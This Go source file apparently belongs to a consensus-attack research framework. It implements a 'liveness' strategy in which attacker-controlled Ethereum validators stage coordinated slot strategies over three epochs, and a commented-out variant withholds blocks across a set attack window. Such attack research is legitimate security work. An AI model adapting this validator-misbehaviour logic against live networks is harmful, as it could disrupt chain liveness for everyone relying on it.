package liveness

import (
	"context"
	// "os"
	"github.com/google/uuid"
	"github.com/prysmaticlabs/prysm/v5/cache/lru"
	log "github.com/sirupsen/logrus"
	"github.com/tsinghua-cel/attacker-service/common"
	"github.com/tsinghua-cel/attacker-service/types"
	"strconv"
	"time"
)

type Instance struct {
	b     types.ServiceBackend
	param types.LibraryParams
}

func (o *Instance) Name() string {
	return "liveness"
}

func (o *Instance) Description() string {
	// implement attack https://ethresear.ch/t/liveness-attack-in-ethereum-pos-protocol-using-randao-manipulation/22241
	desc_eng := "liveness attack without randao manipulation"
	return desc_eng
}

func toInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 999999
	}
	return i
}

func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedbacker types.FeedBacker) {
	olog := log.WithField("name", o.Name())
	olog.Info("start to run strategy (Simplified: No RANDAO Manipulation)")
	attacker := params.Attacker
	o.b = attacker.GetBackend()
	o.param = params
	t := time.NewTicker(time.Second)
	defer t.Stop()
	history := make(map[int]bool)
	epochDutyCache := lru.New(10)

	var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) {
		//if d, exist := epochDutyCache.Get(epoch); exist {
		// return d.([]types.ProposerDuty)
		//} else {
		return nil
		//}
	}
	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) {
		epochDutyCache.Add(epoch, duties)
	}

	triggerring := false
	triggeredEpoch := 0 // record the epoch that strategy is triggered.

	for {
		select {
		case <-ctx.Done():
			log.WithField("name", o.Name()).Info("stop to run strategy")
			return
		case <-t.C:
			state, err := o.b.GetBeaconState("head")
			if err != nil {
				olog.WithField("error", err).Error("failed to get beacon state")
				continue
			}
			slot, _ := state.Slot()
			epoch := common.SlotToEpoch(int64(slot))
			if history[int(epoch)] == true {
				continue
			}

			nextEpoch := epoch + 1
			var curDuty = getCacheDuty(epoch)
			var nextDuty = getCacheDuty(nextEpoch)

			if curDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(epoch); err != nil {
					continue
				} else {
					setCacheDuty(epoch, duty)
					curDuty = duty
				}
			}
			if nextDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(nextEpoch); err != nil {
					continue
				} else {
					setCacheDuty(nextEpoch, duty)
					nextDuty = duty
				}
			}

			o.dumpDuties(epoch, curDuty)
			o.dumpDuties(nextEpoch, nextDuty)

			for {
				if !triggerring {
					slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
					strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
					if err = attacker.UpdateStrategy(strategy); err != nil {
						olog.WithField("error", err).Error("failed to update strategy simple")
					} else {
						olog.WithFields(log.Fields{
							"epoch":    nextEpoch,
							"strategy": strategy,
						}).Debug("update strategy successfully")
					}
					if params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) &&
						params.IsHackValidator(toInt(curDuty[0].ValidatorIndex)) &&
						o.attackerInTailN(params.FilterHackerDuties(curDuty), 9) &&
						epoch > 3 {

						triggerring = true
						triggeredEpoch = int(epoch)
						olog.WithFields(log.Fields{
							"current epoch": epoch,
							"next epoch":    epoch + 1,
						}).Debug("strategy trigger: continuous proposer detected")
						continue
					}
					history[int(epoch)] = true
					break
				} else {
					offset := epoch - int64(triggeredEpoch) + 1
					
					if offset == 1 {
						// Offset 1
						{
							slotsStrategies := genStrategyForTrigger1(int(epoch), params.FilterHackerDuties(curDuty))
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							olog.Warn("!!! ATTACK_TRIGGERED_EVENT !")
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy (offset 1)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"trigger":  triggerring,
									"offset":   1,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FilterHackerDuties(nextDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to pre-update triggering strategy (offset 1->2)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break

					} else if offset == 2 {
						// Offset 2:
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("executing offset 2 strategy (No RANDAO Calc)")

						{
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(epoch), params.FilterHackerDuties(curDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy (offset 2)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger3(int(nextEpoch), params.FilterHackerDuties(nextDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to pre-update triggering strategy (offset 2->3)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break

					} else if offset == 3 {
						// Offset 3:
						
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("executing offset 3 strategy (No RANDAO Calc)")

						{
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger3(int(epoch), params.FilterHackerDuties(curDuty), types.ProposerDuty{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy (offset 3)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("update triggering strategy successfully")
							}
						}
						
						{
							triggerring = false
							slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update strategy simple (reset)")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
								}).Debug("update strategy successfully (reset)")
							}
						}
						history[int(epoch)] = true
						break
					}
				}
			}
		}
	}
}

// func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedbacker types.FeedBacker) {
// 	olog := log.WithField("name", o.Name())
// 	olog.Info("start to run strategy: First-Slot Liveness & Leak Test")
// 	attacker := params.Attacker
// 	o.b = attacker.GetBackend()
// 	o.param = params
// 	t := time.NewTicker(time.Second)
// 	defer t.Stop()

// 	windowStr := os.Getenv("ATTACK_WINDOW")
// 	attackWindow := 3 
// 	if windowStr != "" {
// 		attackWindow, _ = strconv.Atoi(windowStr)
// 	}

// 	startStr := os.Getenv("START_EPOCH")
// 	startEpoch := 2 
// 	if startStr != "" {
// 		startEpoch, _ = strconv.Atoi(startStr)
// 	}
// 	// ===================================

// 	olog.WithFields(log.Fields{
// 		"StartEpoch":   startEpoch,
// 		"AttackWindow": attackWindow,
// 	}).Info("Configuration Loaded")

// 	history := make(map[int]bool)
// 	epochDutyCache := lru.New(10)

// 	// var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) { return nil }
// 	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) { epochDutyCache.Add(epoch, duties) }

// 	for {
// 		select {
// 		case <-ctx.Done():
// 			return
// 		case <-t.C:
// 			state, err := o.b.GetBeaconState("head")
// 			if err != nil {
// 				continue
// 			}
// 			slot, _ := state.Slot()
// 			currentEpoch := int(common.SlotToEpoch(int64(slot)))

// 			if history[currentEpoch] {
// 				continue
// 			}

// 			// 获取 Duty
// 			var curDuty []types.ProposerDuty
// 			if curDuty == nil {
// 				if duty, err := attacker.GetEpochDutiesFromAttack(int64(currentEpoch)); err == nil {
// 					setCacheDuty(int64(currentEpoch), duty)
// 					curDuty = duty
// 				}
// 			}

// 			offset := currentEpoch - startEpoch
			
// 			targetReleaseSlot := common.EpochEnd(int64(currentEpoch))

// 			if offset >= 0 && offset < attackWindow {
// 				olog.WithFields(log.Fields{
// 					"Phase":        "ATTACK",
// 					"Epoch":        currentEpoch,
// 					"TargetWindow": attackWindow,
// 				}).Info("Executing First-Slot Delay Strategy")

// 				slotsStrategies := genTargetedWithholdStrategy(currentEpoch, params.FilterHackerDuties(curDuty), targetReleaseSlot)
				
// 				strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
// 				if err = attacker.UpdateStrategy(strategy); err != nil {
// 					olog.Error("Failed to update strategy")
// 				}

// 			} else {
// 				slotsStrategies := genSimpleStrategy(currentEpoch, params.FilterHackerDuties(curDuty))
// 				strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
// 				attacker.UpdateStrategy(strategy)
// 			}

// 			history[currentEpoch] = true
// 		}
// 	}
// }


func (o *Instance) attackerInTailN(attackDuties []types.ProposerDuty, tailN int) bool {
	if len(attackDuties) == 0 {
		return false
	}
	latest := attackDuties[len(attackDuties)-1]
	slot := toInt(latest.Slot)
	epoch := common.SlotToEpoch(int64(slot))
	epochEnd := common.EpochEnd(epoch)
	return (int(epochEnd) - tailN) <= slot
}

func (s *Instance) dumpDuties(epoch int64, duties []types.ProposerDuty) {
	for _, duty := range duties {
		log.WithFields(log.Fields{
			"epoch":     epoch,
			"slot":      duty.Slot,
			"validator": duty.ValidatorIndex,
		}).Debug("epoch duty")
	}
}